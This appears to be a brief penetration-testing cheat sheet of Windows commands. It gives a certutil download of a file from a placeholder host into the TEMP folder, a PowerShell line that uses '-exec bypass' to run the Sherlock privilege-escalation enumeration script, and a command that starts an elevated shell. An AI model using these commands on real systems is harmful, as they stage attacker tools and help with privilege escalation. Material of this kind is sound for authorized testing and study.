## Download a file
<code> certutil.exe -urlcache -f http://host/src_file C:\Windows\TEMP\destination_file </code>


## Execute ps1 script from cmd 

<code> powershell -exec bypass -command "& 'C:\Windows\TEMP\Sherlock.ps1' | out-file C:\Windows\TEMP\enumresult.txt"  </code>
* & is needed to start the script
* output is written to a file

## Elevate PS to admin (credentials needed) 
<code> Start-Process powershell -Verb runAs </code>

